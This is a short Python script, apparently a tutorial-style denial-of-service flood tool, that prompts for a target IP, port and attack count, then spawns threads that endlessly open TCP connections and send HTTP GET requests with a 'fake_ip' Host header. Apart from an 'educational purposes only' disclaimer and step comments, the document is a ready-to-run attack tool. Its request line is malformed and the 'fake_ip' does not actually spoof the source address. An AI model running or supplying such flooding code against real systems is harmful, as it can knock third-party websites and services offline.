#Warning! This python program is for educational purposes only, please use this on your own website and services.
#Step1: Import Threading and socket libraries
#Step2: Create a method called attack where requests will be generated to a target
#Step3: Use the threading function in Python to increase the number of times the attack will be executed
#Step4: Check the network traffic for results

import threading
import socket

def attack(target_ip, target_port, fake_ip):
    while True:
        #socket AF_INET is a socket type for IPV4 and SOCK_STREAM is a socket type for TCP connections
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(("GET /" + target_ip + "HTTP/1.1\r\n").encode('ascii'),(target_ip, target_port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
        s.close()
        


target_ip = input("What is the target IP or domain? ")
target_port = int(input("What is the target port? "))
num_attacks = int(input("How many attacks do you want? "))
fake_ip = "192.168.100.1"


for i in range(num_attacks):
    thread = threading.Thread(target=attack, args=(target_ip, target_port, fake_ip))
    thread.start()
    print(f"Attack ${i} executed!")